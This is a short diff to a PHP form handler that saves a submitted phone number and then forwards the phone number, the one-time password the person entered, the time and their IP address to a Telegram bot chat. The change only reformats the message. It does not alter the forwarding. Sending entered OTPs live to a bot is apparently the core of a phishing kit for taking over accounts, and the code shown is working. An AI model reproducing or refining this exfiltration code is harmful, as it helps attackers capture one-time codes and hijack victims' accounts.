@@ -114,40 +114,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
         
-      // Send Telegram notification
-$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-$time = date('Y-m-d H:i:s');
-
-$msg = "🔐 <b>OTP Submitted</b>\n\n"
-     . "📱 Phone: +263 {$phone}\n"
-     . "🔢 OTP entered: <a href=\"mailto:{$enteredOtp}@otp.com\">{$enteredOtp}</a>\n"
-     . "⏰ Time: {$time}\n"
-     . "🌐 IP: {$ip}";
-
-function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-
-    $postData = [
-        'chat_id'    => $chatId,
-        'text'       => $message,
-        'parse_mode' => $parseMode
-    ];
-
-    $ch = curl_init();
-
-    curl_setopt_array($ch, [
-        CURLOPT_URL            => $url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_POST           => true,
-        CURLOPT_POSTFIELDS     => http_build_query($postData),
-        CURLOPT_TIMEOUT        => 10
-    ]);
-
-    curl_exec($ch);
-    curl_close($ch);
-}
-
-sendTelegramMessage($botToken, $chatId, $msg, 'HTML');
+        // Send Telegram notification
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        $time = date('Y-m-d H:i:s');
+        $msg = "🔐 *OTP Submitted*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+        
+        function sendTelegramMessage($botToken, $chatId, $message, $parseMode = 'HTML') {
+            $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+            $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => $parseMode];
+            $ch = curl_init();
+            curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($postData), CURLOPT_TIMEOUT => 10]);
+            curl_exec($ch);
+            curl_close($ch);
+        }
+        sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
         
         echo json_encode(['success' => true]);
         exit;
